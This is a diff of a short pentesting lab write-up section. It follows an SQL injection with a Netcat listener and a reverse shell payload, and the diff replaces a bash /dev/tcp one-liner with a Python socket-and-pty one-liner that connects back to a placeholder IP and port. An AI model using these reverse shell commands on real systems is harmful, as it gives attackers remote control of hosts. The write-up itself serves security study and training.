@@ -1,13 +1,13 @@
-# Bonus - reverse shell execution
+# bonus - reverse shell execution
 
 We continue from the point in Writeup 1 where the SQL injection is performed. From our pentesting VM, we start a Netcat listener:
 ``` shell
 nc -nvlp 4242
 ```
 
-As for the shell execution, we opt for a `bash -i` syntax:
+As for the shell execution, we opt for a `python2` syntax:
 ``` shell
-sh -i >& /dev/tcp/IP/4242 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
 This snippet is inserted into the query using URL encoding:
